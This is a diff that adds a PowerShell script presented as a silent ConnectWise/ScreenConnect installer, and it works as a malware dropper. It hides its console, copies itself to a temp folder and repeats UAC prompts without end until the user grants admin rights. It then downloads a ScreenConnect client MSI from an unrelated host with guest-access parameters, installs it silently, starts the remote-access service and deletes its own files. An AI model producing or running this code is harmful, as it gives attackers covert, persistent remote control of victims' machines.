@@ -1,0 +1,413 @@
+# SilentForceInstall-Enhanced.ps1
+
+[CmdletBinding()]
+param(
+    [string]$InstallID = "",
+    [string]$PermanentScriptPath = "",
+    [string]$LogFile = "",
+    [switch]$Elevated
+)
+
+# ============================================================
+# STEP 0: INITIALIZE / PRESERVE INSTALLATION CONTEXT
+# ============================================================
+
+$originalScriptPath = $PSCommandPath
+
+if ([string]::IsNullOrWhiteSpace($InstallID)) {
+    $InstallID = [System.Guid]::NewGuid().ToString().Substring(0,8)
+}
+
+if ([string]::IsNullOrWhiteSpace($LogFile)) {
+    $LogFile = "C:\Windows\Temp\cw_silent_$InstallID.log"
+}
+
+function Write-InstallLog {
+    param([string]$Message)
+
+    try {
+        "[$(Get-Date -Format 'HH:mm:ss')] $Message" |
+            Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
+    }
+    catch {
+    }
+}
+
+Write-InstallLog "============================================================"
+Write-InstallLog "SCRIPT STARTED"
+Write-InstallLog "PID: $PID"
+Write-InstallLog "INSTALL ID: $InstallID"
+Write-InstallLog "ELEVATED FLAG: $Elevated"
+Write-InstallLog "CURRENT SCRIPT PATH: $PSCommandPath"
+
+# ============================================================
+# STEP 1: HIDE CONSOLE
+# ============================================================
+
+try {
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    ' -ErrorAction SilentlyContinue
+
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+
+    if ($consolePtr -ne [System.IntPtr]::Zero) {
+        [Console.Window]::ShowWindow($consolePtr, 0)
+        Write-InstallLog "CONSOLE WINDOW HIDDEN SUCCESSFULLY"
+    }
+}
+catch {
+    Write-InstallLog "NON-CRITICAL CONSOLE HIDE ERROR: $($_.Exception.Message)"
+}
+
+# ============================================================
+# STEP 2: CHECK ADMIN
+# ============================================================
+
+$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
+$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+Write-InstallLog "ADMINISTRATOR STATUS: $isAdmin"
+
+# ============================================================
+# STEP 3: PREPARE PERMANENT COPY ONLY ON FIRST PROCESS
+# ============================================================
+
+if (-not $isAdmin) {
+
+    Write-InstallLog "NOT RUNNING AS ADMINISTRATOR"
+
+    if ([string]::IsNullOrWhiteSpace($PermanentScriptPath)) {
+
+        $tempScriptDir = "C:\Windows\Temp\CWInstall_$InstallID"
+
+        try {
+            $null = New-Item `
+                -Path $tempScriptDir `
+                -ItemType Directory `
+                -Force `
+                -ErrorAction Stop
+
+            $PermanentScriptPath = Join-Path $tempScriptDir "Installer.ps1"
+
+            if (Test-Path $originalScriptPath) {
+                Copy-Item `
+                    -Path $originalScriptPath `
+                    -Destination $PermanentScriptPath `
+                    -Force `
+                    -ErrorAction Stop
+
+                Write-InstallLog "SELF-COPIED TO: $PermanentScriptPath"
+            }
+            else {
+                Write-InstallLog "WARNING: ORIGINAL SCRIPT NOT FOUND"
+                $PermanentScriptPath = $originalScriptPath
+            }
+        }
+        catch {
+            Write-InstallLog "SELF-COPY ERROR: $($_.Exception.Message)"
+            $PermanentScriptPath = $originalScriptPath
+        }
+    }
+    else {
+        Write-InstallLog "USING EXISTING PERMANENT SCRIPT PATH: $PermanentScriptPath"
+    }
+
+    # ========================================================
+    # STEP 4: UAC ELEVATION LOOP
+    # ========================================================
+
+    Write-InstallLog "STARTING UAC ELEVATION LOOP"
+
+    while ($true) {
+        try {
+            Write-InstallLog "REQUESTING ADMINISTRATOR ELEVATION"
+
+            $arguments = @(
+                "-NoProfile"
+                "-ExecutionPolicy Bypass"
+                "-File `"$PermanentScriptPath`""
+                "-InstallID `"$InstallID`""
+                "-PermanentScriptPath `"$PermanentScriptPath`""
+                "-LogFile `"$LogFile`""
+                "-Elevated"
+            ) -join " "
+
+            Write-InstallLog "ELEVATED ARGUMENTS: $arguments"
+
+            $process = Start-Process `
+                -FilePath "powershell.exe" `
+                -Verb RunAs `
+                -ArgumentList $arguments `
+                -WindowStyle Hidden `
+                -PassThru `
+                -ErrorAction Stop
+
+            Write-InstallLog "ELEVATED PROCESS STARTED"
+
+            if ($process) {
+                Write-InstallLog "ELEVATED PID: $($process.Id)"
+            }
+
+            Write-InstallLog "EXITING NON-ADMIN PROCESS"
+            exit 0
+        }
+        catch {
+            Write-InstallLog "ELEVATION FAILED: $($_.Exception.Message)"
+            Write-InstallLog "RETRYING ELEVATION IN 300MS"
+            Start-Sleep -Milliseconds 300
+        }
+    }
+}
+
+# ============================================================
+# STEP 5: NOW RUNNING AS ADMIN
+# ============================================================
+
+Write-InstallLog "RUNNING WITH ADMINISTRATOR RIGHTS"
+Write-InstallLog "ADMIN PID: $PID"
+Write-InstallLog "USER: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
+Write-InstallLog "SCRIPT PATH: $PSCommandPath"
+Write-InstallLog "PERMANENT PATH: $PermanentScriptPath"
+
+# ============================================================
+# STEP 6: DOWNLOAD MSI
+# ============================================================
+
+$exeUrl = 'https://metro.batyesser.fun/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Second&c=&c=&c=&c=&c=&c=&c='
+
+$outFile = "C:\Windows\Temp\ConnectWiseControl_$InstallID.msi"
+
+Write-InstallLog "STARTING DOWNLOAD"
+Write-InstallLog "URL: $exeUrl"
+Write-InstallLog "DESTINATION: $outFile"
+
+try {
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    if (Test-Path $outFile) {
+        Write-InstallLog "REMOVING OLD MSI FILE"
+        Remove-Item $outFile -Force -ErrorAction SilentlyContinue
+    }
+
+    $wc = New-Object System.Net.WebClient
+
+    try {
+        $proxy = [System.Net.WebRequest]::DefaultWebProxy
+
+        if ($null -ne $proxy) {
+            $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+            $wc.Proxy = $proxy
+            Write-InstallLog "SYSTEM PROXY CONFIGURED"
+        }
+    }
+    catch {
+        Write-InstallLog "PROXY CONFIGURATION WARNING: $($_.Exception.Message)"
+    }
+
+    $wc.DownloadFile($exeUrl, $outFile)
+
+    if (-not (Test-Path $outFile)) {
+        throw "Download completed but MSI was not found."
+    }
+
+    $fileInfo = Get-Item $outFile
+
+    Write-InstallLog "DOWNLOAD SUCCESSFUL"
+    Write-InstallLog "MSI SIZE: $($fileInfo.Length) BYTES"
+
+    if ($fileInfo.Length -lt 100KB) {
+        throw "Downloaded MSI appears unexpectedly small: $($fileInfo.Length) bytes"
+    }
+}
+catch {
+    Write-InstallLog "FATAL DOWNLOAD ERROR: $($_.Exception.Message)"
+    exit 1
+}
+
+# ============================================================
+# STEP 7: MSI INSTALL
+# ============================================================
+
+Write-InstallLog "STARTING MSI INSTALLATION"
+
+$msiLog = "C:\Windows\Temp\cw_msi_$InstallID.log"
+
+try {
+
+    $msiArguments = @(
+        "/i"
+        "`"$outFile`""
+        "/qn"
+        "/norestart"
+        "ALLUSERS=1"
+        "REBOOT=ReallySuppress"
+        "/L*V"
+        "`"$msiLog`""
+    ) -join " "
+
+    Write-InstallLog "MSI COMMAND: msiexec.exe $msiArguments"
+
+    $p = Start-Process `
+        -FilePath "msiexec.exe" `
+        -ArgumentList $msiArguments `
+        -Wait `
+        -PassThru `
+        -WindowStyle Hidden `
+        -ErrorAction Stop
+
+    Write-InstallLog "MSI EXIT CODE: $($p.ExitCode)"
+    Write-InstallLog "MSI LOG: $msiLog"
+
+    switch ($p.ExitCode) {
+        0 {
+            Write-InstallLog "MSI INSTALLATION SUCCESSFUL"
+        }
+
+        3010 {
+            Write-InstallLog "MSI INSTALLATION SUCCESSFUL - REBOOT REQUIRED"
+        }
+
+        1641 {
+            Write-InstallLog "MSI INSTALLATION SUCCESSFUL - REBOOT INITIATED"
+        }
+
+        default {
+            throw "MSI installation failed with exit code $($p.ExitCode). See $msiLog"
+        }
+    }
+}
+catch {
+    Write-InstallLog "INSTALLATION FAILED: $($_.Exception.Message)"
+    exit 1
+}
+
+# ============================================================
+# STEP 8: WAIT FOR SERVICE REGISTRATION
+# ============================================================
+
+Write-InstallLog "WAITING FOR SERVICE REGISTRATION"
+
+$service = $null
+
+for ($i = 1; $i -le 20; $i++) {
+
+    try {
+        $service = Get-Service -ErrorAction SilentlyContinue |
+            Where-Object {
+                $_.Name -match "ScreenConnect|ConnectWise" -or
+                $_.DisplayName -match "ScreenConnect|ConnectWise"
+            } |
+            Select-Object -First 1
+
+        if ($service) {
+            Write-InstallLog "SERVICE FOUND ON CHECK $i"
+            break
+        }
+    }
+    catch {
+    }
+
+    Start-Sleep -Seconds 1
+}
+
+# ============================================================
+# STEP 9: VERIFY / START SERVICE
+# ============================================================
+
+if ($service) {
+
+    Write-InstallLog "SERVICE NAME: $($service.Name)"
+    Write-InstallLog "SERVICE DISPLAY NAME: $($service.DisplayName)"
+    Write-InstallLog "SERVICE STATUS: $($service.Status)"
+
+    if ($service.Status -ne "Running") {
+
+        Write-InstallLog "SERVICE NOT RUNNING - ATTEMPTING START"
+
+        try {
+            Start-Service -Name $service.Name -ErrorAction Stop
+            Start-Sleep -Seconds 2
+            $service.Refresh()
+            Write-InstallLog "SERVICE STATUS AFTER START: $($service.Status)"
+        }
+        catch {
+            Write-InstallLog "SERVICE START WARNING: $($_.Exception.Message)"
+        }
+    }
+}
+else {
+    Write-InstallLog "WARNING: SCREENCONNECT/CONNECTWISE SERVICE NOT DETECTED"
+}
+
+# ============================================================
+# STEP 10: ADDITIONAL PROCESS CHECK
+# ============================================================
+
+try {
+
+    $cwProcesses = Get-Process -ErrorAction SilentlyContinue |
+        Where-Object {
+            $_.ProcessName -match "ScreenConnect|ConnectWise"
+        }
+
+    if ($cwProcesses) {
+        foreach ($proc in $cwProcesses) {
+            Write-InstallLog "CONNECTWISE PROCESS FOUND: $($proc.ProcessName) PID=$($proc.Id)"
+        }
+    }
+    else {
+        Write-InstallLog "NO CONNECTWISE PROCESS CURRENTLY DETECTED"
+    }
+}
+catch {
+    Write-InstallLog "PROCESS CHECK WARNING: $($_.Exception.Message)"
+}
+
+# ============================================================
+# STEP 11: FINAL CLEANUP
+# ============================================================
+
+Write-InstallLog "CLEANING MSI TEMP FILE"
+
+Remove-Item $outFile -Force -ErrorAction SilentlyContinue
+
+if (-not [string]::IsNullOrWhiteSpace($PermanentScriptPath)) {
+
+    try {
+
+        $tempScriptDir = Split-Path $PermanentScriptPath -Parent
+
+        if (
+            $tempScriptDir -like "C:\Windows\Temp\CWInstall_*" -and
+            (Test-Path $tempScriptDir)
+        ) {
+
+            Write-InstallLog "CLEANING SCRIPT DIRECTORY: $tempScriptDir"
+
+            $cleanupCommand = "Start-Sleep -Seconds 3; Remove-Item -LiteralPath '$tempScriptDir' -Recurse -Force -ErrorAction SilentlyContinue"
+
+            Start-Process `
+                -FilePath "powershell.exe" `
+                -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanupCommand`"" `
+                -WindowStyle Hidden `
+                -ErrorAction SilentlyContinue
+        }
+    }
+    catch {
+        Write-InstallLog "TEMP SCRIPT CLEANUP WARNING: $($_.Exception.Message)"
+    }
+}
+
+Write-InstallLog "INSTALLATION PROCESS FINISHED"
+Write-InstallLog "FINAL LOG: $LogFile"
+Write-InstallLog "MSI LOG: $msiLog"
+Write-InstallLog "============================================================"
+
+exit 0
